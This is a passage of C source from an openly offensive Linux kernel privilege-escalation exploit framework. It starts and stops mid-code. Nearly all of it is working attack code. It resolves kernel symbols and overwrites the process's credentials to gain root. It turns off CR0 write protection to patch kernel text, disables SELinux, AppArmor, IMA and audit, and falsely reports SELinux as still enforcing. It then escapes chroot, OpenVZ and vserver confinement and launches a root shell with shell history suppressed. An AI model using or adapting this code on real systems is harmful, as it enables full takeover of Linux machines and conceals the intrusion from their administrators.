#define KSTACK_MAX  0xfffffffff0000000UL
#else
#define KERNEL_BASE 0xc0000000UL
#define KSTACK_MIN  0xc0000000UL
#define KSTACK_MAX  0xfffff000UL
#endif

char *exit_stack;

static inline unsigned long get_current_4k(void)
{
	unsigned long current = 0;
	unsigned long exec_domain = 0;

	current = (unsigned long)&current;

	exec_domain = *(unsigned long *)((current & ~(0x1000 - 1)) + sizeof(unsigned long));
	current = *(unsigned long *)(current & ~(0x1000 - 1));
	if (current < KSTACK_MIN || current > KSTACK_MAX)
		return 0;
	if (exec_domain < KSTACK_MIN || exec_domain > KSTACK_MAX)
		return 0;
	if (default_exec_domain && exec_domain != default_exec_domain)
		return 0;
	if (*(long *)current != TASK_RUNNING)
		return 0;

	return current;
}

static inline unsigned long get_current_8k(void)
{
	unsigned long current = 0;
	unsigned long exec_domain = 0;
	unsigned long oldstyle = 0;

	eightk_stack = 1;

	current = (unsigned long)&current;
	oldstyle = current & ~(0x2000 - 1);
	current = *(unsigned long *)(oldstyle);
	exec_domain = *(unsigned long *)(oldstyle + sizeof(unsigned long));

	twofourstyle = 1;
	if (current < KSTACK_MIN || current > KSTACK_MAX)
		return oldstyle;
	if (exec_domain < KSTACK_MIN || exec_domain > KSTACK_MAX)
		return oldstyle;
	if (default_exec_domain && exec_domain != default_exec_domain)
		return oldstyle;
	if (*(long *)current != TASK_RUNNING)
		return oldstyle;

	twofourstyle = 0;
	return current;
}

static int requires_symbols_to_trigger;

static int kallsyms_is_hidden;

static unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	struct utsname ver;
	int ret;
	int rep = 0;
	int oldstyle = 0;

	if (kallsyms_is_hidden)
		goto fallback;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL)
			goto fallback;
		oldstyle = 1;
	}

repeat:
	ret = 0;
	while(ret != EOF) {
		if (!oldstyle)
			ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		else {
			ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S."))
					continue;
				p = strrchr(sname, '_');
				if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p > (char *)sname && *(p - 1) == '_')
						p--;
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname) && addr) {
			fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		} else if (!strcmp(name, sname)) {
			kallsyms_is_hidden = 1;
		}
	}

	fclose(f);
	if (rep == 2)
		return 0;
	else if (rep == 1)
		goto fallback2;
fallback:
	/* didn't find the symbol, let's retry with the System.map
	   dedicated to the pointlessness of Russell Coker's SELinux
	   test machine (why does he keep upgrading the kernel if
	   "all necessary security can be provided by SE Linux"?)
	*/
	uname(&ver);
	if (!strncmp(ver.release, "2.4", 3) || !strncmp(ver.release, "2.2", 3))
		oldstyle = 1;
	sprintf(sname, "/boot/System.map-%s", ver.release);
	f = fopen(sname, "r");
	if (f == NULL)
		goto fallback2;
	rep = 1;
	goto repeat;
fallback2:
	/* didn't find the symbol, let's retry with the System.map
	   dedicated to the pointlessness of Russell Coker's SELinux
	   test machine (why does he keep upgrading the kernel if
	   "all necessary security can be provided by SE Linux"?)
	*/
	uname(&ver);
	if (!strncmp(ver.release, "2.4", 3) || !strncmp(ver.release, "2.2", 3))
		oldstyle = 1;
	sprintf(sname, "./System.map-%s", ver.release);
	f = fopen(sname, "r");
	if (f == NULL) {
		sprintf(sname, "./System.map");
		f = fopen(sname, "r");
		if (f == NULL) {
			if (requires_symbols_to_trigger) {
				printf("Unable to acquire kernel symbols.  Copy the appropriate System.map to the current directory.\n");
				exit(1);
			} else
				return 0;
		}
	}
	rep = 2;
	goto repeat;
}

/* for switching from interrupt to process context */
unsigned long *ptmx_fops;

/* check for xen support */
unsigned long *xen_start_info;
int xen_detected;
int can_change_ptes;

/* check if DEBUG_RODATA only protects .rodata */
unsigned long mark_rodata_ro;
unsigned long set_kernel_text_ro;

int *audit_enabled;
int *ima_audit;

int *selinux_enforcing;
int *selinux_enabled;
int *sel_enforce_ptr;

int *apparmor_enabled;
int *apparmor_logsyscall;
int *apparmor_audit;
int *apparmor_complain;

unsigned long *init_task;
unsigned long init_fs;

unsigned long *bad_file_ops;
unsigned long bad_file_aio_read;

unsigned long vc_sock_stat;

unsigned char *ima_bprm_check;
unsigned char *ima_file_mmap;
unsigned char *ima_path_check;
/* whoa look at us, 2.6.33 support before it's even released */
unsigned char *ima_file_check;

unsigned long *security_ops;
unsigned long default_security_ops;

unsigned long sel_read_enforce;

int what_we_do;

unsigned int our_uid;

typedef void __attribute__((regparm(3))) (* _set_fs_root)(unsigned long fs, unsigned long path);
typedef void __attribute__((regparm(3))) (* _set_fs_pwd)(unsigned long fs, unsigned long path);
typedef bool __attribute__((regparm(3))) (* _virt_addr_valid)(unsigned long addr);

typedef void __attribute__((regparm(3))) (* _prepare_ve0_process)(unsigned long tsk);

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

typedef void __attribute__((regparm(3))) (* _make_lowmem_page_readonly)(unsigned long addr);
typedef void __attribute__((regparm(3))) (* _make_lowmem_page_readwrite)(unsigned long addr);

_make_lowmem_page_readonly make_lowmem_page_readonly;
_make_lowmem_page_readwrite make_lowmem_page_readwrite;
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
_prepare_ve0_process prepare_ve0_process;
_set_fs_root set_fs_root;
_set_fs_pwd set_fs_pwd;
_virt_addr_valid virt_addr_valid;

struct cred {
	int usage; // must be >= 4
	int uid; // 0
	int gid; // 0
	int suid; // 0
	int sgid; // 0
	int euid; // 0
	int egid; // 0
	int fsuid; // 0
	int fsgid; // 0
	int securebits; // SECUREBITS_DEFAULT 0x00000000
	unsigned int cap_inheritable[2]; // CAP_INIT_INH_SET {0, 0}
	unsigned int cap_permitted[2]; // CAP_FULL_SET { ~0, ~0 }
	unsigned int cap_effective[2]; // CAP_INIT_EFF_SET { ~(1 << 8), ~0 }
	unsigned int cap_bset[2]; // CAP_INIT_BSET -> CAP_FULL_SET || CAP_INIT_EFF_SET
};

static inline unsigned long *pg_to_ptr(unsigned long addr)
{
	return (unsigned long *)(0xffff880000000000UL + (addr & 0x000ffffffffff000UL));
}

static inline unsigned long pte_to_kaddr(unsigned long pte)
{
	return 0xffffffff80000000UL + (pte & 0x000ffffffffff000UL);
}

#define NUM_RANGES 32

static unsigned long valid_ranges[NUM_RANGES][2];

/* elito #2 */
static inline void find_kernel_ranges(void)
{
	unsigned long i, z, t;
	unsigned long _cr3;
	unsigned long *kernelpg;
	unsigned long *kernelpte;
	int rangeidx = 0;
	int x = -1;

	if (valid_ranges[0][0])
		return;

	asm volatile (
	"mov %%cr3, %0"
	: "=r" (_cr3)
	);

	kernelpg = pg_to_ptr(pg_to_ptr(pg_to_ptr(_cr3)[511])[510]);
	for (i = 0; i < 511; i++) {
		if ((kernelpg[i] & 1) && x < 0) {
			x = i;
		}
		if (!(kernelpg[i+1] & 1) && x >= 0) {
			break;
		}
	}
	for (z = x; z <= i; z++) {
		// large page
		if ((kernelpg[z] & (1 << 7)) && !valid_ranges[rangeidx][0])
			valid_ranges[rangeidx][0] = pte_to_kaddr(kernelpg[z]);
		else if (!(kernelpg[z] & (1 << 7))) {
			// check 4K pages
			kernelpte = pg_to_ptr(kernelpg[z]);
			for (t = 0; t < 511; t++) {
				if ((kernelpte[t] & 0x1) && !valid_ranges[rangeidx][0])
					valid_ranges[rangeidx][0] = pte_to_kaddr(kernelpte[t]);
				else if (!(kernelpte[t] & 0x1) && !valid_ranges[rangeidx][1]) {
					valid_ranges[rangeidx][1] = pte_to_kaddr(kernelpg[z]);
					rangeidx++;
				}
				else if (!(kernelpte[t+1] & 0x1) && !valid_ranges[rangeidx][1]) {
					valid_ranges[rangeidx][1] = pte_to_kaddr(kernelpte[t]) + 0x1000;
					rangeidx++;
				}
			}
		}
	}
	if (valid_ranges[rangeidx][0] && !valid_ranges[rangeidx][1]) {
		valid_ranges[rangeidx][1] = pte_to_kaddr(kernelpg[i]) + 0x200000;
	}
}

static inline unsigned long find_init_cred(void)
{
	unsigned long len;
	struct cred *tmp;
	int i, x;

	find_kernel_ranges();
	if (!valid_ranges[0][0] || !valid_ranges[0][1])
		return 0;

	for (x = 0; valid_ranges[x][0]; x++) {
	for (i = 0; i < valid_ranges[x][1] - valid_ranges[x][0] - sizeof(struct cred); i++) {
		tmp = (struct cred *)valid_ranges[x][0];
		if (tmp->usage >= 4 && tmp->uid == 0 && tmp->gid == 0 &&
		    tmp->suid == 0 && tmp->sgid == 0 && tmp->euid == 0 &&
		    tmp->egid == 0 && tmp->fsuid == 0 && tmp->fsgid == 0 &&
		    tmp->securebits == 0 && tmp->cap_inheritable[0] == 0 &&
		    tmp->cap_inheritable[1] == 0 && tmp->cap_permitted[0] == ~0 &&
		    tmp->cap_permitted[1] == ~0 &&
		    (tmp->cap_effective[0] == ~(1 << 8) || tmp->cap_effective[0] == ~0) &&
		    tmp->cap_effective[1] == ~0 &&
		    (tmp->cap_bset[0] == ~0 || tmp->cap_bset[0] == ~(1 << 8)) && 
		    tmp->cap_bset[1] == ~0)
			return (unsigned long)tmp;
	}
	}

	return 0UL;
}

static void bella_mafia_quackafella_records_incorporated_by_rhyme_syndicate_three_yellow_men_trillionaire_club(unsigned long orig_current)
{
	/* cause it's a trillion dollar industry */
	unsigned char *current = (unsigned char *)orig_current;
	struct cred *init_cred_addr, **cred, **real_cred;
	int i;

	init_cred_addr = (struct cred *)find_init_cred();
	if (!init_cred_addr)
		return;

	/* ok, we couldn't find our UIDs in the task struct
	   and we don't have the symbols for the creds
	   framework, discover it in a stupidly easy way:
	   in task_struct:
	   ...stuff...
	   const struct cred *real_cred;
	   const struct cred *cred;
	   struct mutex cred_exec_mutex;
	   char comm[16];
	   ...stuff...

	   if we were executed from main, then our name is
	   "exploit", otherwise it's "pulseaudio"
	   then we find init_cred through heuristics
	   increment its refcnt appropriately
	   and set up our credentials
	*/

	for (i = 0; i < 0x1000 - 16; i++) {
		if ((exp_state.run_from_main == 1 && !memcmp(&current[i], "exploit", strlen("exploit") + 1)) ||
		    (exp_state.run_from_main == 0 && !memcmp(&current[i], "pulseaudio", strlen("pulseaudio") + 1))) {
			/* now work backwards till we find the two cred pointers
			*/
			for (i-=sizeof(unsigned long); i > sizeof(unsigned long); i-=sizeof(unsigned long)) {
				if (*((unsigned long *)&current[i]) != *((unsigned long *)&current[i-sizeof(unsigned long)]))
					continue;
				 // unlocked
				cred_offset = i - sizeof(char *);
				real_cred = (struct cred **)&current[i-sizeof(char *)];
				cred = (struct cred **)&current[i];
				/* found init_cred, so now point our
				   cred struct to it, and increment usage!
				*/
				*real_cred = *cred = init_cred_addr;
				init_cred_addr->usage+=2;
				exp_state.got_root = 1;
				return;
			}
			return;
		}
	}
	return;
}

static void give_it_to_me_any_way_you_can(void)
{
	unsigned long orig_current;

	orig_current = get_current_4k();
	if (orig_current == 0)
		orig_current = get_current_8k();

	current_addr = orig_current;

	if (commit_creds && prepare_kernel_cred) {
		commit_creds(prepare_kernel_cred(0));
		exp_state.got_root = 1;
	} else {
		unsigned int *current;

		current = (unsigned int *)orig_current;
		while (((unsigned long)current < (orig_current + 0x1000 - 17 )) &&
			(current[0] != our_uid || current[1] != our_uid ||
			 current[2] != our_uid || current[3] != our_uid))
			current++;

		if ((unsigned long)current >= (orig_current + 0x1000 - 17 )) {
			bella_mafia_quackafella_records_incorporated_by_rhyme_syndicate_three_yellow_men_trillionaire_club(orig_current);
			cred_support = 1;
			return;
		}
		exp_state.got_root = 1;
		/* clear the UIDs and GIDs */
		memset(current, 0, sizeof(unsigned int) * 8);
		/* now let's try to elevate our capabilities as well (pre-creds structure)
		   2.4 has next: int ngroups; gid_t groups[NGROUPS]; then caps
		   2.6 has next: struct group_info *group_info; then caps
		   we could actually capget, but lets assume all three are 0
		   in both cases, the capabilities occur before:
			unsigned keep_capabilities:1;
			struct user_struct *user;
		   so we'll be fine with clobbering all 0s in between
		  */
		{
			int i;
			int zeroed;

			current += 8; // skip uids/gids
			/* skip over any next pointer */
			current += (sizeof(unsigned long) == sizeof(unsigned int)) ? 1 : 2;
			for (i = 0; i < 40; i++) {
				if (!current[i]) {
					zeroed = 1;
					current[i] = 0xffffffff;
					raised_caps = 1;
				/* once we zero a block, stop when we 
				   find something non-zero
				*/
				} else if (zeroed)
					break;
			}
		}
	}

	return;
}

unsigned long inline get_cr0(void)
{
	unsigned long _cr0;

	asm volatile (
	"mov %%cr0, %0"
	: "=r" (_cr0)
	);

	return _cr0;
}

void inline set_cr0(unsigned long _cr0)
{
	asm volatile (
	"mov %0, %%cr0"
	:
	: "r" (_cr0)
	);
}

int inline turn_off_wp(void)
{
	unsigned long _cr0;

	/* if xen is enabled and we can change ptes then we'll do that */
	if (can_change_ptes)
		return 1;
	/* don't do it if xen is enabled and we can't just
	   write to kernel .text */
	if (xen_detected && mark_rodata_ro && set_kernel_text_ro)
		return 0;
	/* if it's just xen, don't use cr0 or we'll GPF */
	if (xen_detected)
		return 1;

	_cr0 = get_cr0();
	_cr0 &= ~0x10000;
	set_cr0(_cr0);

	return 1;
}

void inline turn_on_wp(void)
{
	unsigned long _cr0;

	/* if it's just xen, don't use cr0 or we'll GPF */
	if (xen_detected)
		return;

	_cr0 = get_cr0();
	_cr0 |= 0x10000;
	set_cr0(_cr0);
}

unsigned long trigger_retaddr;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_gs;

static void get_segment_descriptors(void)
{
#ifdef __x86_64__
	asm volatile (
	"movq %%cs, %0 ;"
	"movq %%ss, %1 ;"
	: "=r" (user_cs), "=r" (user_ss)
	:
	: "memory"
	);
#else
	asm volatile (
	"push %%cs ;"
	"pop %0 ;"
	"push %%ss ;"
	"pop %1 ;"
	"push %%gs ;"
	"pop %2 ;"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_gs)
	:
	: "memory"
	);
#endif
}


/* greets to qaaz */
static void exit_kernel(void)
{
#ifdef __x86_64__
	asm volatile (
	"swapgs ;"
	"movq %0, 0x20(%%rsp) ;"
	"movq %1, 0x18(%%rsp) ;"
	"movq %2, 0x10(%%rsp) ;"
	"movq %3, 0x08(%%rsp) ;"
	"movq %4, 0x00(%%rsp) ;"
	"iretq"
	: : "r" (user_ss), "r" (exit_stack + (1024 * 1024) - 0x80), "i" (USER_EFLAGS),
	"r" (user_cs), "r" (trigger_retaddr)
	);
#else
	asm volatile (
	"pushl %0 ;"
	"pop %%gs ;"
	"movl %1, 0x10(%%esp) ;"
	"movl %2, 0x0c(%%esp) ;"
	"movl %3, 0x08(%%esp) ;"
	"movl %4, 0x04(%%esp) ;"
	"movl %5, 0x00(%%esp) ;"
	"iret"
	: : "r" (user_gs), "r" (user_ss), "r" (exit_stack + (1024 * 1024) - 0x80), "i" (USER_EFLAGS),
	"r" (user_cs), "r" (trigger_retaddr)
	);
#endif
}

static _trigger_the_bug trigger;
static int main_ret;

void trigger_get_return(void)
{
	trigger_retaddr = (unsigned long)__builtin_return_address(0);
	main_ret = trigger();
	if (!main_ret)
		exit(0);
	return;
}

static void make_range_readwrite(unsigned long start, unsigned long len)
{
	unsigned long end;

	if (!can_change_ptes)
		return;

	end = start + len;

	make_lowmem_page_readwrite(start);

	// check if the entire range fits in one page
	if ((start >> 12) != (end >> 12))
		make_lowmem_page_readwrite(end);

	return;
}
static void make_range_readonly(unsigned long start, unsigned long len)
{
	unsigned long end;

	if (!can_change_ptes)
		return;

	end = start + len;

	make_lowmem_page_readonly(start);

	// check if the entire range fits in one page
	if ((start >> 12) != (end >> 12))
		make_lowmem_page_readonly(end);

	return;
}

static _ring0_cleanup ring0_cleanup;
static unsigned long get_kallsyms_lookup_name(void);

static int return_to_process_context;

static inline int are_interrupts_disabled(void)
{
	unsigned long flags;

#ifdef __x86_64
	asm volatile(
	"pushfq\n"
	"mov (%%rsp), %0\n"
	"popfq\n"
	: "=r" (flags)
	);
#else
	asm volatile(
	"pushf\n"
	"mov (%%esp), %0\n"
	"popf\n"
	: "=r" (flags)
	);
#endif

	return !(flags & (1 << 9));
}

static inline void chroot_breakout(void)
{
	int x, z;
	unsigned long *fsptr;
	unsigned long *initfsptr;

	if (!init_task || !init_fs || !set_fs_root || !set_fs_pwd || !current_addr || !virt_addr_valid)
		return;

	initfsptr = (unsigned long *)init_fs;

	for (x = 0; x < 0x1000/sizeof(unsigned long); x++) {
		if (init_task[x] != init_fs)
			continue;
		fs_offset = x * sizeof(unsigned long);
		fsptr = (unsigned long *)*(unsigned long *)(current_addr + fs_offset);
		if (fsptr == NULL)
			continue;
		// we replace root and pwd too, so adjust reference counters
		// accordingly
		for (z = 0; z < 6; z++) {
			/* lemony snicket's a series of unfortunate ints */
#ifdef __x86_64__
			if (fsptr[z] == 0xffffffff00000000UL)
				continue;
#endif
			if (virt_addr_valid(fsptr[z]) && virt_addr_valid(fsptr[z+1]) &&
			    virt_addr_valid(fsptr[z+2]) && virt_addr_valid(fsptr[z+3])) {
				set_fs_root((unsigned long)fsptr, (unsigned long)&initfsptr[z]);
				set_fs_pwd((unsigned long)fsptr, (unsigned long)&initfsptr[z+2]);
				return;
			}
		}
		return;
	}
}

struct vserver_struct {
	unsigned long val1;
	unsigned long val2;
	unsigned int val3;
	unsigned int val4;
};

static inline void vserver_breakout(void)
{
	char zeroes[32] = {};
	int vserver_base;
	unsigned int *vinfo, *ninfo;
	unsigned long *curr;
	struct vserver_struct *vserv;
	int x;

	if (!init_task || !current_addr || !virt_addr_valid || !vc_sock_stat)
		return;

	for (x = 0; x < 0x1000/sizeof(unsigned long); x++) {
		vserver_base = x * sizeof(unsigned long);
		vserv = (struct vserver_struct *)(current_addr + vserver_base);
#ifdef __x86_64__
		if (!memcmp(&init_task[x], &zeroes, 32) &&
		    virt_addr_valid(vserv->val1) && virt_addr_valid(vserv->val2) &&
		    vserv->val3 && vserv->val4) {
			vinfo = (unsigned int *)vserv->val1;
			ninfo = (unsigned int *)vserv->val2;
			if (vinfo[4] == vserv->val3 &&
			    ninfo[4] == vserv->val4) {
				vserver_offset = vserver_base;
				memset((void *)(current_addr + vserver_base), 0, sizeof(struct vserver_struct));
				break;
			}
		}
#else
		/* currently broken */
		break;
		if (!memcmp(&init_task[x], &zeroes, 16) &&
		    virt_addr_valid(vserv->val1) && virt_addr_valid(vserv->val2) &&
		    vserv->val3 && vserv->val4) {
			vinfo = (unsigned int *)vserv->val1;
			ninfo = (unsigned int *)vserv->val2;
			if (vinfo[2] == vserv->val3 &&
			    ninfo[2] == vserv->val4) {
				has_vserver = 1;
				vserver_offset = vserver_base;
				memset((void *)(current_addr + vserver_base), 0, sizeof(struct vserver_struct));
				break;
			}
		}
#endif
	}
}

static int __attribute__((regparm(3))) own_the_kernel(unsigned long a)
{
	_kallsyms_lookup_name lookup;

	if (return_to_process_context == 1 && ptmx_fops && aio_read_offset) {
		return_to_process_context = 2;
		ptmx_fops[aio_read_offset] = 0;
		goto resume_own;
	}

	if (exp_state.got_ring0 == 1) {
		/* we were already executed, just do nothing this time */
		return -1;
	}

	exp_state.got_ring0 = 1;

	if (ring0_cleanup)
		ring0_cleanup();

	exp_state.kallsyms_lookup_name = lookup = (_kallsyms_lookup_name)get_kallsyms_lookup_name();

	if (lookup) {
		set_fs_root = (_set_fs_root)lookup("set_fs_root");
		set_fs_pwd = (_set_fs_pwd)lookup("set_fs_pwd");
		virt_addr_valid = (_virt_addr_valid)lookup("__virt_addr_valid");
		vc_sock_stat = (unsigned long)lookup("vc_sock_stat");
		prepare_ve0_process = (_prepare_ve0_process)lookup("prepare_ve0_process");
		init_task = (unsigned long *)lookup("init_task");
		init_fs = (unsigned long)lookup("init_fs");
		default_exec_domain = (unsigned long)lookup("default_exec_domain");
		bad_file_ops = (unsigned long *)lookup("bad_file_ops");
		bad_file_aio_read = (unsigned long)lookup("bad_file_aio_read");
		ima_audit = (int *)lookup("ima_audit");
		ima_file_mmap = (unsigned char *)lookup("ima_file_mmap");
		ima_bprm_check = (unsigned char *)lookup("ima_bprm_check");
		ima_path_check = (unsigned char *)lookup("ima_path_check");
		ima_file_check = (unsigned char *)lookup("ima_file_check");
		selinux_enforcing = (int *)lookup("selinux_enforcing");
		selinux_enabled = (int *)lookup("selinux_enabled");
		apparmor_enabled = (int *)lookup("apparmor_enabled");
		apparmor_complain = (int *)lookup("apparmor_complain");
		apparmor_audit = (int *)lookup("apparmor_audit");
		apparmor_logsyscall = (int *)lookup("apparmor_logsyscall");
		security_ops = (unsigned long *)lookup("security_ops");
		default_security_ops = lookup("default_security_ops");
		sel_read_enforce = lookup("sel_read_enforce");
		audit_enabled = (int *)lookup("audit_enabled");
		commit_creds = (_commit_creds)lookup("commit_creds");
		prepare_kernel_cred = (_prepare_kernel_cred)lookup("prepare_kernel_cred");
		xen_start_info = (unsigned long *)lookup("xen_start_info");
		mark_rodata_ro = lookup("mark_rodata_ro");
		set_kernel_text_ro = lookup("set_kernel_text_ro");
		make_lowmem_page_readonly = (_make_lowmem_page_readonly)lookup("make_lowmem_page_readonly");
		make_lowmem_page_readwrite = (_make_lowmem_page_readwrite)lookup("make_lowmem_page_readwrite");
		ptmx_fops = (unsigned long *)lookup("ptmx_fops");
	}

	if (bad_file_ops && bad_file_aio_read) {
		int t;
		for (t = 0; t < 30; t++) {
			if (bad_file_ops[t] == bad_file_aio_read)
				aio_read_offset = t;
		}
	}

	if (are_interrupts_disabled() && ptmx_fops && aio_read_offset && !ptmx_fops[aio_read_offset]) {
		ptmx_fops[aio_read_offset] = (unsigned long)&own_the_kernel;
		return_to_process_context = 1;
		exit_kernel();
	}

resume_own:

	if (xen_start_info && *xen_start_info)
		xen_detected = 1;

	if (xen_detected && mark_rodata_ro && set_kernel_text_ro && make_lowmem_page_readonly && make_lowmem_page_readwrite)
		can_change_ptes = 1;

	if (audit_enabled)
		*audit_enabled = 0;

	if (ima_audit)
		*ima_audit = 0;

	// disable apparmor
	if (apparmor_enabled && *apparmor_enabled) {
		what_we_do |= DISABLED_APPARMOR;
			*apparmor_enabled = 0;
		if (apparmor_audit)
			*apparmor_audit = 0;
		if (apparmor_logsyscall)
			*apparmor_logsyscall = 0;
		if (apparmor_complain)
			*apparmor_complain = 0;
	}

	// disable SELinux
	if (selinux_enforcing && *selinux_enforcing) {
		what_we_do |= DISABLED_SELINUX;
		*selinux_enforcing = 0;
	}

	if (!selinux_enabled || (selinux_enabled && *selinux_enabled == 0)) {
		// trash LSM
		if (default_security_ops && security_ops) {
			/* only list it as LSM if we're disabling 
			   something other than apparmor */
			if (*security_ops != default_security_ops)
				what_we_do |= DISABLED_LSM;
			*security_ops = default_security_ops;
		}
	}

	/* TPM this, dedicated to rcvalle, redpig, and the powerglove
	   NOW you're playing with power!

	   IMA only hashes kernel modules loaded or things run/mmap'd executable
	   as root.  This of course doesn't include our exploit.  So let's
	   just stop appending to the TPM'd hash list all together.

	   Of course, clever minds could think of something better to do here with
	   this code, or re-enable it once they were done executing code as root
	*/

	if (ima_bprm_check && ima_file_mmap && (ima_path_check || ima_file_check)) {
		if (turn_off_wp()) {
			if (memcmp(ima_bprm_check, "\x31\xc0\xc3", 3)) {
				/* xor eax, eax / retn */
				make_range_readwrite((unsigned long)ima_bprm_check, 3);
				ima_bprm_check[0] = '\x31';
				ima_bprm_check[1] = '\xc0';
				ima_bprm_check[2] = '\xc3';
				make_range_readonly((unsigned long)ima_bprm_check, 3);
				what_we_do |= DISABLED_IMA;
			}
			if (memcmp(ima_file_mmap, "\x31\xc0\xc3", 3)) {
				/* xor eax, eax / retn */
				make_range_readwrite((unsigned long)ima_file_mmap, 3);
				ima_file_mmap[0] = '\x31';
				ima_file_mmap[1] = '\xc0';
				ima_file_mmap[2] = '\xc3';
				make_range_readonly((unsigned long)ima_file_mmap, 3);
				what_we_do |= DISABLED_IMA;
			}
			if (ima_path_check && memcmp(ima_path_check, "\x31\xc0\xc3", 3)) {
				/* xor eax, eax / retn */
				make_range_readwrite((unsigned long)ima_path_check, 3);
				ima_path_check[0] = '\x31';
				ima_path_check[1] = '\xc0';
				ima_path_check[2] = '\xc3';
				make_range_readonly((unsigned long)ima_path_check, 3);
				what_we_do |= DISABLED_IMA;
			}
			if (ima_file_check && memcmp(ima_file_check, "\x31\xc0\xc3", 3)) {
				/* xor eax, eax / retn */
				make_range_readwrite((unsigned long)ima_file_check, 3);
				ima_file_check[0] = '\x31';
				ima_file_check[1] = '\xc0';
				ima_file_check[2] = '\xc3';
				make_range_readonly((unsigned long)ima_file_check, 3);
				what_we_do |= DISABLED_IMA;
			}
			turn_on_wp();
		}
	}

	/* if we just set SELinux into permissive mode,
	   make the idiots think selinux is enforcing
	*/
	if (sel_read_enforce) {
		unsigned char *p;
		int can_write;
		can_write = turn_off_wp();

		if (sizeof(unsigned int) != sizeof(unsigned long)) {
			/* 64bit version, look for the mov ecx, [rip+off]
			   and replace with mov ecx, 1
			*/
			for (p = (unsigned char *)sel_read_enforce; (unsigned long)p < (sel_read_enforce + 0x30); p++) {
				if (p[0] == 0x8b && p[1] == 0x0d) {
					if (!selinux_enforcing) {
						// determine address of rip+off, as it's our selinux_enforcing
						sel_enforce_ptr = (int *)((char *)p + 6 + *(int *)&p[2]);
						if (*sel_enforce_ptr) {
							*sel_enforce_ptr = 0;
							what_we_do |= DISABLED_SELINUX;
						}
					}
					if (can_write && (what_we_do & DISABLED_SELINUX)) {
						make_range_readwrite((unsigned long)p, 6);
						p[0] = '\xb9';
						p[5] = '\x90';
						*(unsigned int *)&p[1] = 1;
						make_range_readonly((unsigned long)p, 6);
					}
				}
			}
		} else {
			/* 32bit, replace push [selinux_enforcing] with push 1 */
			for (p = (unsigned char *)sel_read_enforce; (unsigned long)p < (sel_read_enforce + 0x20); p++) {
				if (p[0] == 0xff && p[1] == 0x35 && *(unsigned int *)&p[2] > 0xc0000000) {
					// while we're at it, disable 
					// SELinux without having a 
					// symbol for selinux_enforcing ;)
					if (!selinux_enforcing) {
						sel_enforce_ptr = *(int **)&p[2];
						if (*sel_enforce_ptr) {
							*sel_enforce_ptr = 0;
							what_we_do |= DISABLED_SELINUX;
						}
					}
					if (can_write && (what_we_do & DISABLED_SELINUX)) {
						make_range_readwrite((unsigned long)p, 6);
						p[0] = '\x68';
						p[5] = '\x90';
						*(unsigned int *)&p[1] = 1;
						make_range_readonly((unsigned long)p, 6);
					}
				} else if (p[0] == 0xa1 &&
					*(unsigned int *)&p[1] > 0xc0000000) {
					/* old 2.6 are compiled different */
					if (!selinux_enforcing) {
						sel_enforce_ptr = *(int **)&p[1];
						if (*sel_enforce_ptr) {
							*sel_enforce_ptr = 0;
							what_we_do |= DISABLED_SELINUX;
						}
					}
					if (can_write && (what_we_do & DISABLED_SELINUX)) {
						make_range_readwrite((unsigned long)p, 5);
						p[0] = '\xb8';
						*(unsigned int *)&p[1] = 1;
						make_range_readonly((unsigned long)p, 5);
					}
				}
			}
		}

		turn_on_wp();
	}

	// push it real good
	give_it_to_me_any_way_you_can();

	// break out of chroot, mnt namespace
	chroot_breakout();

	// break out of OpenVZ
	if (prepare_ve0_process && current_addr) {
		prepare_ve0_process(current_addr);
	}

	// break out of vserver
	// find xid/vx_info/nid/nx_info -- they'll be zero in init_task but set in our confined task
	// once found, zero it out
	// can be made more reliable by verifying struct with xid info obtained from /proc
	vserver_breakout();

	return -1;
}

/* we do this so that we can swap the stack out later if we need to upon returning to userland
   and we won't lose any "local" variables, so the perf_counter exploit can have the same
   pretty printouts as all the others ;)
   note that -fomit-frame-pointer is required to pull this hack off
*/

static unsigned char *mem = NULL;
static _prepare_for_exploit prepare;
static _get_exploit_state_ptr get_exploit_state_ptr;
static _post_exploit post;
static int requires_null_page;
static int exp_idx;

int cwd_dirfd;

/* more sgrakkyu/twiz love */
static void exec_rootshell(void)
{
	char buf[PATH_MAX+1];
	struct stat st;
	int ret;

	char *argv[] = { "/bin/sh", "-i", NULL };
	char *argvbash[] = { "/bin/sh", "--norc", "--noprofile", NULL };
	char *envp[] = { "TERM=linux", "BASH_HISTORY=/dev/null", "HISTORY=/dev/null", 
			"history=/dev/null", 
			"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
			NULL };
	char *envpbash[] = { "TERM=linux", "PS1=1",
			"BASH_HISTORY=/dev/null", "HISTORY=/dev/null", 
			"history=/dev/null", 
			"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
			NULL };
	memset(buf, 0, sizeof(buf));

	ret = stat("/bin/bash", &st);

	readlink("/bin/sh", buf, PATH_MAX);

	setgroups(0, NULL); // uses CAP_SETGID, we don't care if it succeeds
			    // though it should always

	// change back to saved working directory
	if (cwd_dirfd >= 0)
		fchdir(cwd_dirfd);

	/* if /bin/sh points to dash and /bin/bash exists, use /bin/bash */
	    printf(" [+] UID %d, EUID:%d GID:%d, EGID:%d\n", getuid(), geteuid(), getgid(), getegid());
    printf(" [+] Run ./suid \"ls -la;id\":\n"); 
